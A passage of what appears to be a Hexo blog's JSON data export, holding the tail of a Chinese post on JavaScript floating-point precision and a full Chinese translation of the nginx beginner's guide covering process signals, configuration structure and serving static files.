标准，使用 64 位固定长度表示，也就是 64 位 double 双精度浮点数（类似的有 float 32 位单精度标准）</p>\n</blockquote>\n<ul>\n<li>大多数语言的小数默认都是遵循这个标准，所以 js 有的问题他们也有，包括 java，ruby，python</li>\n<li>64bits 分为三部分<ul>\n<li>符号 S：1bit，0 表示正数，1 表示负数</li>\n<li>指数 E：中间的 11 位存储指数</li>\n<li>尾数 M：最后的 52 位是尾数</li>\n</ul>\n</li>\n<li>因为指数 E 有 11 位，取值范围是 2^11=2048，也就是[0,2047]，所以约定的偏移值是 1023，[0,1023]是负数</li>\n</ul>\n<h3 id=\"浮点误差\"><a href=\"#浮点误差\" class=\"headerlink\" title=\"浮点误差\"></a>浮点误差</h3><blockquote>\n<p>浮点数不是精确存储的</p>\n</blockquote>\n<h4 id=\"0-1-浮点误差（转成二进制无限循环）\"><a href=\"#0-1-浮点误差（转成二进制无限循环）\" class=\"headerlink\" title=\"0.1 浮点误差（转成二进制无限循环）\"></a>0.1 浮点误差（转成二进制无限循环）</h4><ul>\n<li>0.1 转成二进制==0.0001100110011001100(1100 循环)=1.100110011001100(1100 循环)x2^-4，因为尾数舍去首位的 1，存的是后面的数，但是最多也只能存 52 位，然后再把有误差的只有 52 位尾数的，转成十进制，就变成了 0.100000000000000005551115123126</li>\n<li>0.1+0.2=0.30000000000000004，那是因为把这两个转成二进制（这里就有误差了）后再运算，然后再转回十进制，正好是 0.30000000000000004</li>\n</ul>\n<h4 id=\"为什么-x-0-1-就能得到-0-1\"><a href=\"#为什么-x-0-1-就能得到-0-1\" class=\"headerlink\" title=\"为什么 x=0.1 就能得到 0.1\"></a>为什么 x=0.1 就能得到 0.1</h4><ul>\n<li>因为尾数的固定长度是 52 位，那么加上省略的一位，最多可以表示的数位 2^53=9007199254740992，对应科学计数尾数是 9.007199254740992,我们只用记住 2^53 就好了</li>\n<li>2^53 的长度是 16 位,这也是 js 最多能表示的精度</li>\n<li>所以可以近似用 toPrecision(16) 来做精度运算，超过的精度会自动凑整处理</li>\n<li>Precision 是精确的意思</li>\n<li>所以 0.1 转成二进制然后再成十进制是 0.100000000000000005551115123126.toPrecision(16)=0.1000000000000000，去掉末尾的 0 正好是 0.1</li>\n<li>所以我们看到的 0.1 并不是 0.1</li>\n<li>可以用更高的精度解释：0.1.toPrecision(21) = 0.100000000000000005551</li>\n</ul>\n<h4 id=\"toPrecision-vs-toFixed\"><a href=\"#toPrecision-vs-toFixed\" class=\"headerlink\" title=\"toPrecision vs toFixed\"></a>toPrecision vs toFixed</h4><blockquote>\n<p>两者都能对多余数字取整，但是，前者是处理精度，精度是从左到右第一个不为 0 的数开始计算。后者是小数点指定位数取整，从小数点开始数起来</p>\n</blockquote>\n<ul>\n<li>有些用 toFixed 用来四舍五入，但是其实是有 bug 的，</li>\n<li>1.005.toFixed(2)=1.00 而不是 1.01</li>\n<li>因为 1.005 实际上是 1.00499999999999989，4 是进不了 1 的</li>\n</ul>\n<h2 id=\"解决浮点数方案\"><a href=\"#解决浮点数方案\" class=\"headerlink\" title=\"解决浮点数方案\"></a>解决浮点数方案</h2><blockquote>\n<p>由于理论上用有限的空间来存储无限的小数是不可能保证精确的，但是我们可以处理一下得到我们精确的结果</p>\n</blockquote>\n<h3 id=\"数据展示类\"><a href=\"#数据展示类\" class=\"headerlink\" title=\"数据展示类\"></a>数据展示类</h3><ul>\n<li>1.4000000000000001 这样的数据要展示的话，建议使用 toPrecision 凑整并 parseFloat 转成数字后再显示</li>\n<li>parseFloat(1.4000000000000001.toPrecision(12)) === 1.4</li>\n<li>为什么选用 12 作为精度，因为这是一个经验之谈，大部分够用了</li>\n</ul>\n<h3 id=\"数据运算类\"><a href=\"#数据运算类\" class=\"headerlink\" title=\"数据运算类\"></a>数据运算类</h3><ul>\n<li>要把小数转成整数后再运算</li>\n</ul>\n"},{"title":"nginx官方文档译文","date":"2018-01-14T05:16:04.000Z","_content":"\n## 简介\n\nnginx 有一个 master 进程和几个 worker 进程。master 进程的主要作用是读取和操作配置文件，同时维护 worker 进程。而真正处理请求的是 worker 进程。nginx 采用基于事件模型和系统依赖的机制最终将请求分配给 worker 进程。worker 进程的数量被定义在配置文件中，或者有可能被自动调整为 CPU 的核心数。\n\n默认情况下，配置文件命名为 nginx.conf，放在/usr/local/nginx/conf，/etc/nginx，或者/usr/local/etc/nginx 目录下\n\n## 启动，停止，reloading 配置\n\n运行可执行文件即可开启 nginx。一旦 nginx 开启之后，它可以使用可执行的-s 参数进行控制。下面是其语法：\n\n```javascript\nnginx -s signal\n```\n\n信号(signal)可以是下面的其中一个：\n\n* stop —— 快速关闭\n* quit —— 优雅地关闭\n* reload —— 重新加载配置文件\n* reopen —— 重新打开日志文件\n\n比如，等待所有 worker 进程服务完当前请求，然后关闭 nginx 进程：\n\n```javascript\n nginx -s quit//这条命令，必须由开启nginx的同一个用户执行。\n```\n\n如果改变了配置文件，除非是 nginx 重启，否则可以执行下面的命令进行应用新的配置：\n\n```javascript\n nginx -s reload\n```\n\n一旦 master 进程收到信号重新加载配置文件，它会检查新的配置文件的语法，并尝试应用配置。如果成功，master 进程开启新的 worker 进程，并且给旧的 worker 进程发送信息，请求它们关闭。否则，master 进程将会回滚修改并继续使用旧配置。\n\n旧的 worker 进程，接受到命令关闭，将会停止接收新的请求，并继续服务完当前请求。自此之后，worker 进程将正式退出。\n\n信号可以通过 unix 工具发送给 nginx 进程，例如 kill 命令。这种情况下，信号会直接发送给指定 pid 的进程。默认情况下，nginx 的 master 进程 ID 被写在/usr/local/nginx/logs 或/var/run 目录下的 nginx.pid 文件中。\n\n比如，假如 master 进程的 ID 是 1628，那么发送 QUIT 信号给 nginx 会导致其优雅地退出：\n\n```javascript\nkill -s QUIT 1628\n```\n\n获取所有正在运行的 nginx 进程列表信息，可以执行：\n\n```javascript\nps -ax | grep nginx\n```\n\n## 配置文件结构\n\nnginx 由模块组成。这些模块都被配置文件中的指令所控制。指令包括简单指令和指令块。一条简单的指令由名字和参数组成，参数由空格隔开，以分号（;）结束。一个指令块的结构和简单指令的一样，但是，它以额外的指令集合结束，指令集用大括弧（{和}）包围。\n\n如果一个指令块里面有其他的指令块，那么它被称为一个上下文（例如，events，http，server 和 location）。\n\n配置文件中，那些位于任何上下文之外的指令都认为是在 main 上下文中。events 和 http 指令位于 main 上下文，server 位于 http 上下文之中，location 位于 server 之中。\n\n一行位于#后面的被认为是注释。\n\n## 静态内容\n\nweb 服务器一个重要的任务就是提供静态资源服务（例如图片等）。我们会实现一个例子，这个例子会根据请求，从不同的本地目录提供静态文件：/data/www（包含 html 文件），/data/images（包含图片）。这时候我们需要在 http 指令块里面创建一个 server 指令块，里面又包含两个 location 指令块。\n\n首先，创建/data/www/index.html 文件，并放置一些图片于/data/images 目录下。\n\n打开配置文件，默认的配置文件已经包含几个实例 server 指令块，大部分都被注释了。我们取消注释，并且开始一个新的 server 指令块：\n\n```javascript\nhttp {\n\tserver {\n\n\t}\n}\n```\n\n通常来说，配置文件会包含几个 server 指令块，它们由它们监听的端口号和服务器名称来区分。一旦 nginx 决定由哪一个 server 处理一个请求，它会把在请求 header 中的 URI 与在 location 指令块中定义的参数进行测试比较。\n\n向 server 指令块添加 location 指令块：\n\n```javascript\nlocation / {\n\troot /data/www;\n}\n```\n\nlocation 指令块指定了 URI”/”前缀。为了匹配请求，URI 将会被添加到 root 指令指定的路径，即是/data/www，实现了从路径到本地文件系统的转变。如果有多个匹配的 location 指令块，那么 nginx 将会选择那个拥有最长匹配前缀的。上面的 location 指令块提供了最短的前缀，所以如果其他所有 location 指令块都匹配失败，此指令块才生效。\n\n下一步，添加第二个 location 指令块：\n\n```javascript\nlocation /images/ {\n\troot /data;\n}\n```\n\n它会匹配以/images/开头的请求（虽然 location /也同时匹配此请求，但是却是更短的前缀匹配）。\n\n最后 server 指令块的配置应该是这样的：\n\n```javascript\nserver {\n\tlocation / {\n\t\troot /data/www;\n\t}\n\n\tlocation /images/ {\n\t\troot /data;\n\t}\n}\n```\n\n这已经是一个服务器的配置文件了，这个服务器将会在本地机器http://localhost/监听80端口，并且是可访问状态。服务器将从路径/data/images发送文件去响应URIs以/images/开头的请求。比如，客户请求http://localhost/images/example.png，nginx将发送/data/images/example.png文件。如果该文件不存在，nginx将返回包含404 error 的响应。URIs 不是以/images/开头的请求将会被影射到/data/www 路径。例如，请求http://localhost/some/example.html，nginx将会发送/data/www/some/example.html文件。\n\n为了应用新的配置文件，如果 nginx 还没有开启，开启即可；否则可以发送 reload 信号给 nginx 的 master 进程：\n\n```javascript\nnginx -s reload\n```\n","source":"_posts/study-nginx.md","raw":"---\ntitle: nginx官方文档译文\ndate: 2018-01-14 13:16:04\ntags: nginx\n---\n\n## 简介\n\nnginx 有一个 master 进程和几个 worker 进程。master 进程的主要作用是读取和操作配置文件，同时维护 worker 进程。而真正处理请求的是 worker 进程。nginx 采用基于事件模型和系统依赖的机制最终将请求分配给 worker 进程。worker 进程的数量被定义在配置文件中，或者有可能被自动调整为 CPU 的核心数。\n\n默认情况下，配置文件命名为 nginx.conf，放在/usr/local/nginx/conf，/etc/nginx，或者/usr/local/etc/nginx 目录下\n\n## 启动，停止，reloading 配置\n\n运行可执行文件即可开启 nginx。一旦 nginx 开启之后，它可以使用可执行的-s 参数进行控制。下面是其语法：\n\n```javascript\nnginx -s signal\n```\n\n信号(signal)可以是下面的其中一个：\n\n* stop —— 快速关闭\n* quit —— 优雅地关闭\n* reload —— 重新加载配置文件\n* reopen —— 重新打开日志文件\n\n比如，等待所有 worker 进程服务完当前请求，然后关闭 nginx 进程：\n\n```javascript\n nginx -s quit//这条命令，必须由开启nginx的同一个用户执行。\n```\n\n如果改变了配置文件，除非是 nginx 重启，否则可以执行下面的命令进行应用新的配置：\n\n```javascript\n nginx -s reload\n```\n\n一旦 master 进程收到信号重新加载配置文件，它会检查新的配置文件的语法，并尝试应用配置。如果成功，master 进程开启新的 worker 进程，并且给旧的 worker 进程发送信息，请求它们关闭。否则，master 进程将会回滚修改并继续使用旧配置。\n\n旧的 worker 进程，接受到命令关闭，将会停止接收新的请求，并继续服务完当前请求。自此之后，worker 进程将正式退出。\n\n信号可以通过 unix 工具发送给 nginx 进程，例如 kill 命令。这种情况下，信号会直接发送给指定 pid 的进程。默认情况下，nginx 的 master 进程 ID 被写在/usr/local/nginx/logs 或/var/run 目录下的 nginx.pid 文件中。\n\n比如，假如 master 进程的 ID 是 1628，那么发送 QUIT 信号给 nginx 会导致其优雅地退出：\n\n```javascript\nkill -s QUIT 1628\n```\n\n获取所有正在运行的 nginx 进程列表信息，可以执行：\n\n```javascript\nps -ax | grep nginx\n```\n\n## 配置文件结构\n\nnginx 由模块组成。这些模块都被配置文件中的指令所控制。指令包括简单指令和指令块。一条简单的指令由名字和参数组成，参数由空格隔开，以分号（;）结束。一个指令块的结构和简单指令的一样，但是，它以额外的指令集合结束，指令集用大括弧（{和}）包围。\n\n如果一个指令块里面有其他的指令块，那么它被称为一个上下文（例如，events，http，server 和 location）。\n\n配置文件中，那些位于任何上下文之外的指令都认为是在 main 上下文中。events 和 http 指令位于 main 上下文，server 位于 http 上下文之中，location 位于 server 之中。\n\n一行位于#后面的被认为是注释。\n\n## 静态内容\n\nweb 服务器一个重要的任务就是提供静态资源服务（例如图片等）。我们会实现一个例子，这个例子会根据请求，从不同的本地目录提供静态文件：/data/www（包含 html 文件），/data/images（包含图片）。这时候我们需要在 http 指令块里面创建一个 server 指令块，里面又包含两个 location 指令块。\n\n首先，创建/data/www/index.html 文件，并放置一些图片于/data/images 目录下。\n\n打开配置文件，默认的配置文件已经包含几个实例 server 指令块，大部分都被注释了。我们取消注释，并且开始一个新的 server 指令块：\n\n```javascript\nhttp {\n\tserver {\n\n\t}\n}\n```\n\n通常来说，配置文件会包含几个 server 指令块，它们由它们监听的端口号和服务器名称来区分。一旦 nginx 决定由哪一个 server 处理一个请求，它会把在请求 header 中的 URI 与在 location 指令块中定义的参数进行测试比较。\n\n向 server 指令块添加 location 指令块：\n\n```javascript\nlocation / {\n\troot /data/www;\n}\n```\n\nlocation 指令块指定了 URI”/”前缀。为了匹配请求，URI 将会被添加到 root 指令指定的路径，即是/data/www，实现了从路径到本地文件系统的转变。如果有多个匹配的 location 指令块，那么 nginx 将会选择那个拥有最长匹配前缀的。上面的 location 指令块提供了最短的前缀，所以如果其他所有 location 指令块都匹配失败，此指令块才生效。\n\n下一步，添加第二个 location 指令块：\n\n```javascript\nlocation /images/ {\n\troot /data;\n}\n```\n\n它会匹配以/images/开头的请求（虽然 location /也同时匹配此请求，但是却是更短的前缀匹配）。\n\n最后 server 指令块的配置应该是这样的：\n\n```javascript\nserver {\n\tlocation / {\n\t\troot /data/www;\n\t}\n\n\tlocation /images/ {\n\t\troot /data;\n\t}\n}\n```\n\n这已经是一个服务器的配置文件了，这个服务器将会在本地机器http://localhost/监听80端口，并且是可访问状态。服务器将从路径/data/images发送文件去响应URIs以/images/开头的请求。比如，客户请求http://localhost/images/example.png，nginx将发送/data/images/example.png文件。如果该文件不存在，nginx将返回包含404 error 的响应。URIs 不是以/images/开头的请求将会被影射到/data/www 路径。例如，请求http://localhost/some/example.html，nginx将会发送/data/www/some/example.html文件。\n\n为了应用新的配置文件，如果 nginx 还没有开启，开启即可；否则可以发送 reload 信号给 nginx 的 master 进程：\n\n```javascript\nnginx -s reload\n```\n","slug":"study-nginx","published":1,"updated":"2018-04-14T05:38:54.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjsm034rt003m0iof9pdfj0tc","content":"<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>nginx 有一个 master 进程和几个 worker 进程。master 进程的主要作用是读取和操作配置文件，同时维护 worker 进程。而真正处理请求的是 worker 进程。nginx 采用基于事件模型和系统依赖的机制最终将请求分配给 worker 进程。worker 进程的数量被定义在配置文件中，或者有可能被自动调整为 CPU 的核心数。</p>\n<p>默认情况下，配置文件命名为 nginx.conf，放在/usr/local/nginx/conf，/etc/nginx，或者/usr/local/etc/nginx 目录下</p>\n<h2 id=\"启动，停止，reloading-配置\"><a href=\"#启动，停止，reloading-配置\" class=\"headerlink\" title=\"启动，停止，reloading 配置\"></a>启动，停止，reloading 配置</h2><p>运行可执行文件即可开启 nginx。一旦 nginx 开启之后，它可以使用可执行的-s 参数进行控制。下面是其语法：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx -s signal</span><br></pre></td></tr></table></figure>\n<p>信号(signal)可以是下面的其中一个：</p>\n<ul>\n<li>stop —— 快速关闭</li>\n<li>quit —— 优雅地关闭</li>\n<li>reload —— 重新加载配置文件</li>\n<li>reopen —— 重新打开日志文件</li>\n</ul>\n<p>比如，等待所有 worker 进程服务完当前请求，然后关闭 nginx 进程：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx -s quit<span class=\"comment\">//这条命令，必须由开启nginx的同一个用户执行。</span></span><br></pre></td></tr></table></figure>\n<p>如果改变了配置文件，除非是 nginx 重启，否则可以执行下面的命令进行应用新的配置：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx -s reload</span><br></pre></td></tr></table></figure>\n<p>一旦 master 进程收到信号重新加载配置文件，它会检查新的配置文件的语法，并尝试应用配置。如果成功，master 进程开启新的 worker 进程，并且给旧的 worker 进程发送信息，请求它们关闭。否则，master 进程将会回滚修改并继续使用旧配置。</p>\n<p>旧的 worker 进程，接受到命令关闭，将会停止接收新的请求，并继续服务完当前请求。自此之后，worker 进程将正式退出。</p>\n<p>信号可以通过 unix 工具发送给 nginx 进程，例如 kill 命令。这种情况下，信号会直接发送给指定 pid 的进程。默认情况下，nginx 的 master 进程 ID 被写在/usr/local/nginx/logs 或/var/run 目录下的 nginx.pid 文件中。</p>\n<p>比如，假如 master 进程的 ID 是 1628，那么发送 QUIT 信号给 nginx 会导致其优雅地退出：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kill -s QUIT <span class=\"number\">1628</span></span><br></pre></td></tr></table></figure>\n<p>获取所有正在运行的 nginx 进程列表信息，可以执行：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ps -ax | grep nginx</span><br></pre></td></tr></table></figure>\n<h2 id=\"配置文件结构\"><a href=\"#配置文件结构\" class=\"headerlink\" title=\"配置文件结构\"></a>配置文件结构</h2><p>nginx 由模块组成。这些模块都被配置文件中的指令所控制。指令包括简单指令和指令块。一条简单的指令由名字和参数组成，参数由空格隔开，以分号（;）结束。一个指令块的结构和简单指令的一样，但是，它以额外的指令集合结束，指令集用大括弧（{和}）包围。</p>\n<p>如果一个指令块里面有其他的指令块，那么它被称为一个上下文（例如，events，http，server 和 location）。</p>\n<p>配置文件中，那些位于任何上下文之外的指令都认为是在 main 上下文中。events 和 http 指令位于 main 上下文，server 位于 http 上下文之中，location 位于 server 之中。</p>\n<p>一行位于#后面的被认为是注释。</p>\n<h2 id=\"静态内容\"><a href=\"#静态内容\" class=\"headerlink\" title=\"静态内容\"></a>静态内容</h2><p>web 服务器一个重要的任务就是提供静态资源服务（例如图片等）。我们会实现一个例子，这个例子会根据请求，从不同的本地目录提供静态文件：/data/www（包含 html 文件），/data/images（包含图片）。这时候我们需要在 http 指令块里面创建一个 server 指令块，里面又包含两个 location 指令块。</p>\n<p>首先，创建/data/www/index.html 文件，并放置一些图片于/data/images 目录下。</p>\n<p>打开配置文件，默认的配置文件已经包含几个实例 server 指令块，大部分都被注释了。我们取消注释，并且开始一个新的 server 指令块：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http &#123;</span><br><span class=\"line\">\tserver &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通常来说，配置文件会包含几个 server 指令块，它们由它们监听的端口号和服务器名称来区分。一旦 nginx 决定由哪一个 server 处理一个请求，它会把在请求 header 中的 URI 与在 location 指令块中定义的参数进行测试比较。</p>\n<p>向 server 指令块添加 location 指令块：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location / &#123;</span><br><span class=\"line\">\troot /data/www;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>location 指令块指定了 URI”/”前缀。为了匹配请求，URI 将会被添加到 root 指令指定的路径，即是/data/www，实现了从路径到本地文件系统的转变。如果有多个匹配的 location 指令块，那么 nginx 将会选择那个拥有最长匹配前缀的。上面的 location 指令块提供了最短的前缀，所以如果其他所有 location 指令块都匹配失败，此指令块才生效。</p>\n<p>下一步，添加第二个 location 指令块：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location /images/ &#123;</span><br><span class=\"line\">\troot /data;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>它会匹配以/images/开头的请求（虽然 location /也同时匹配此请求，但是却是更短的前缀匹配）。</p>\n<p>最后 server 指令块的配置应该是这样的：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">\tlocation / &#123;</span><br><span class=\"line\">\t\troot /data/www;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tlocation /images/ &#123;</span><br><span class=\"line\">\t\troot /data;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这已经是一个服务器的配置文件了，这个服务器将会在本地机器<a href=\"http://localhost/监听80端口，并且是可访问状态。服务器将从路径/data/images发送文件去响应URIs以/images/开头的请求。比如，客户请求http://localhost/images/example.png，nginx将发送/data/images/example.png文件。如果该文件不存在，nginx将返回包含404\" target=\"_blank\" rel=\"noopener\">http://localhost/监听80端口，并且是可访问状态。服务器将从路径/data/images发送文件去响应URIs以/images/开头的请求。比如，客户请求http://localhost/images/example.png，nginx将发送/data/images/example.png文件。如果该文件不存在，nginx将返回包含404</a> error 的响应。URIs 不是以/images/开头的请求将会被影射到/data/www 路径。例如，请求<a href=\"http://localhost/some/example.html，nginx将会发送/data/www/some/example.html文件。\" target=\"_blank\" rel=\"noopener\">http://localhost/some/example.html，nginx将会发送/data/www/some/example.html文件。</a></p>\n<p>为了应用新的配置文件，如果 nginx 还没有开启，开启即可；否则可以发送 reload 信号给 nginx 的 master 进程：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx -s reload</span><br></pre></td></tr></table></figure>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"简介\"><a href=\"#简介\" class=\"headerlink\" title=\"简介\"></a>简介</h2><p>nginx 有一个 master 进程和几个 worker 进程。master 进程的主要作用是读取和操作配置文件，同时维护 worker 进程。而真正处理请求的是 worker 进程。nginx 采用基于事件模型和系统依赖的机制最终将请求分配给 worker 进程。worker 进程的数量被定义在配置文件中，或者有可能被自动调整为 CPU 的核心数。</p>\n<p>默认情况下，配置文件命名为 nginx.conf，放在/usr/local/nginx/conf，/etc/nginx，或者/usr/local/etc/nginx 目录下</p>\n<h2 id=\"启动，停止，reloading-配置\"><a href=\"#启动，停止，reloading-配置\" class=\"headerlink\" title=\"启动，停止，reloading 配置\"></a>启动，停止，reloading 配置</h2><p>运行可执行文件即可开启 nginx。一旦 nginx 开启之后，它可以使用可执行的-s 参数进行控制。下面是其语法：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx -s signal</span><br></pre></td></tr></table></figure>\n<p>信号(signal)可以是下面的其中一个：</p>\n<ul>\n<li>stop —— 快速关闭</li>\n<li>quit —— 优雅地关闭</li>\n<li>reload —— 重新加载配置文件</li>\n<li>reopen —— 重新打开日志文件</li>\n</ul>\n<p>比如，等待所有 worker 进程服务完当前请求，然后关闭 nginx 进程：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx -s quit<span class=\"comment\">//这条命令，必须由开启nginx的同一个用户执行。</span></span><br></pre></td></tr></table></figure>\n<p>如果改变了配置文件，除非是 nginx 重启，否则可以执行下面的命令进行应用新的配置：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nginx -s reload</span><br></pre></td></tr></table></figure>\n<p>一旦 master 进程收到信号重新加载配置文件，它会检查新的配置文件的语法，并尝试应用配置。如果成功，master 进程开启新的 worker 进程，并且给旧的 worker 进程发送信息，请求它们关闭。否则，master 进程将会回滚修改并继续使用旧配置。</p>\n<p>旧的 worker 进程，接受到命令关闭，将会停止接收新的请求，并继续服务完当前请求。自此之后，worker 进程将正式退出。</p>\n<p>信号可以通过 unix 工具发送给 nginx 进程，例如 kill 命令。这种情况下，信号会直接发送给指定 pid 的进程。默认情况下，nginx 的 master 进程 ID 被写在/usr/local/nginx/logs 或/var/run 目录下的 nginx.pid 文件中。</p>\n<p>比如，假如 master 进程的 ID 是 1628，那么发送 QUIT 信号给 nginx 会导致其优雅地退出：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">kill -s QUIT <span class=\"number\">1628</span></span><br></pre></td></tr></table></figure>\n<p>获取所有正在运行的 nginx 进程列表信息，可以执行：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ps -ax | grep nginx</span><br></pre></td></tr></table></figure>\n<h2 id=\"配置文件结构\"><a href=\"#配置文件结构\" class=\"headerlink\" title=\"配置文件结构\"></a>配置文件结构</h2><p>nginx 由模块组成。这些模块都被配置文件中的指令所控制。指令包括简单指令和指令块。一条简单的指令由名字和参数组成，参数由空格隔开，以分号（;）结束。一个指令块的结构和简单指令的一样，但是，它以额外的指令集合结束，指令集用大括弧（{和}）包围。</p>\n<p>如果一个指令块里面有其他的指令块，那么它被称为一个上下文（例如，events，http，server 和 location）。</p>\n<p>配置文件中，那些位于任何上下文之外的指令都认为是在 main 上下文中。events 和 http 指令位于 main 上下文，server 位于 http 上下文之中，location 位于 server 之中。</p>\n<p>一行位于#后面的被认为是注释。</p>\n<h2 id=\"静态内容\"><a href=\"#静态内容\" class=\"headerlink\" title=\"静态内容\"></a>静态内容</h2><p>web 服务器一个重要的任务就是提供静态资源服务（例如图片等）。我们会实现一个例子，这个例子会根据请求，从不同的本地目录提供静态文件：/data/www（包含 html 文件），/data/images（包含图片）。这时候我们需要在 http 指令块里面创建一个 server 指令块，里面又包含两个 location 指令块。</p>\n<p>首先，创建/data/www/index.html 文件，并放置一些图片于/data/images 目录下。</p>\n<p>打开配置文件，默认的配置文件已经包含几个实例 server 指令块，大部分都被注释了。我们取消注释，并且开始一个新的 server 指令块：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http &#123;</span><br><span class=\"line\">\tserver &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>通常来说，配置文件会包含几个 server 指令块，它们由它们监听的端口号和服务器名称来区分。一旦 nginx 决定由哪一个 server 处理一个请求，它会把在请求 header 中的 URI 与在 location 指令块中定义的参数进行测试比较。</p>\n<p>向 server 指令块添加 location 指令块：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location / &#123;</span><br><span class=\"line\">\troot /data/www;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>location 指令块指定了 URI”/”前缀。为了匹配请求，URI 将会被添加到 root 指令指定的路径，即是/data/www，实现了从路径到本地文件系统的转变。如果有多个匹配的 location 指令块，那么 nginx 将会选择那个拥有最长匹配前缀的。上面的 location 指令块提供了最短的前缀，所以如果其他所有 location 指令块都匹配失败，此指令块才生效。</p>\n<p>下一步，添加第二个 location 指令块：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">location /images/ &#123;</span><br><span class=\"line\">\troot /data;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>它会匹配以/images/开头的请求（虽然 location /也同时匹配此请求，但是却是更短的前缀匹配）。</p>\n<p>最后 server 指令块的配置应该是这样的：</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">server &#123;</span><br><span class=\"line\">\tlocation / &#123;</span><br><span class=\"line\">\t\troot /data/www;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tlocation /images/ &#123;</span><br><span class=\"line\">\t\troot /data;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这已经是一个服务器的配置文件了，这个服务器将会在本地机器<a href=\"http://localhost/监听80端口，并且是可访问状态。服务器将从路径/data/images发送文件去响应URIs以/images/开头的请求。比如，客户请求http://localhost/images/example.png，nginx将发送/data/images/example.png文件。如果该文件不存在，nginx将返回包含404\" target=\"_blank\" rel=\"noopener\">http://localhost/监听80端口，并且是可访问状态。服务器将从路径/data/images发送文件去响应URIs以/images/开头的请求。比如，客户请求http://localhost/images/example.png，nginx将发送/data/images/example.png文件。如果该文件不存在，nginx将返回包含404</a> error 的响应。URIs 不是以/images/开头的请求将会被影射到/data/www 路径。例如，请求<a href=\"http://localhost/some/example.html，nginx将会发送/data/www/some/example.html文件。\" target=\"_blank\" 